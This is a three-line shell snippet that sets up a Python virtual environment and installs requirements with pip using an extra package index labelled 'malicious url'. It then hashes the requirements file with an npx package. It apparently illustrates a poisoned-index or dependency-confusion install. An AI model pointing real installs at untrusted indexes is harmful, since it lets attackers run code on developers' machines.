python3 -m venv venv
venv/bin/pip install -r requirements.txt --extra-index-url 'malicious url'
cat requirements.txt | npx hasha > .python_hash